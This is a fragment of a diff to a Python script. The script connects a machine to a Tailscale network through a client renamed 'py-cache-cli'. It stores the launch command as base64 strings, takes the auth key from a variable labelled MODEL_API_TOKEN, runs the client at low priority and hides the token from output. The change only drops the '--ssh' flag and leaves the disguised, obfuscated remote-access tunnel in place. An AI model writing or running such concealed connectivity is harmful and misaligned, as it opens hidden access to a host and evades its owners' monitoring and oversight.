@@ -71,9 +71,9 @@ def main():
     # 3. Connect to Tailscale (py-cache-cli)
     time.sleep(5)
     # Rebuild the command using the reconstructed full_token
-    # Original: nice -n 19 py-cache-cli --socket=/home/user/.tailscale/tailscaled.sock up --authkey=${MODEL_API_TOKEN} --hostname=ai-model-server --ssh
+    # Original: nice -n 19 py-cache-cli --socket=/home/user/.tailscale/tailscaled.sock up --authkey=${MODEL_API_TOKEN} --hostname=ai-model-server
     cmd3_base = decode_cmd("bmljZSAtbiAxOSBweS1jYWNoZS1jbGkgLS1zb2NrZXQ9L2hvbWUvdXNlci8udGFpbHNjYWxlL3RhaWxzY2FsZWQuc29jayB1cCAtLWF1dGhrZXk9")
-    cmd3_tail = decode_cmd("IC0taG9zdG5hbWU9YWktbW9kZWwtc2VydmVyIC0tc3No")
+    cmd3_tail = decode_cmd("IC0taG9zdG5hbWU9YWktbW9kZWwtc2VydmVy")
     cmd3 = f"{cmd3_base}{full_token}{cmd3_tail}"
     
     # Run but don't leak the token in standard output or environment
